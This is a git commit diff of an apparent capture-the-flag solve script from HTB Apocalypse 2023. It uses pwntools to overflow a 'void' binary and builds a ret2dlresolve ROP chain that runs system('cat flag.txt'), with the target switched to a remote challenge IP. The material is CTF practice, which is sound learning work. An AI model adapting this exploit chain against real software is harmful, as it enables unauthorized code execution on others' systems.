26026393ee598c772a88a32ddefc3a03d876cb92
maulvialf <maulvialf@gmail.com>
2023-03-23 22:15:38 +0700

    fix

--- 2023/htb-apocalypse-2023/pwn/rev_control_room/solve.py
+++ 2023/htb-apocalypse-2023/pwn/rev_control_room/solve.py
@@ -11,10 +11,11 @@ context.arch = "amd64"
 #libc = ELF('/usr/lib32/libc.so.6')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)       
 
+
 e = ELF('void')
 
 if(len(argv) == 2):
-    p = connect("localhost", 9090)
+    p = connect("159.65.62.241", 30802)
 else:
     p = process('void')
     # p = gdb.debug('void', cmd)
@@ -30,13 +31,21 @@ sleep(0.3)
 
 context.binary = elf = e
 # print(e.address)
-rop = ROP(context.binary)
+rop = ROP(elf)
 dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["cat flag.txt"])
 rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
 rop.ret2dlresolve(dlresolve)
 raw_rop = rop.chain()
 print(rop.dump())
 
+
 pload = raw_rop
+print(len(pload))
+
+# p.sendline(b"A" * 0x40 + b"B" * 8 + pload)
+
+# p.sendline(dlresolve.payload)
+
+p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload}))
 
 p.interactive()
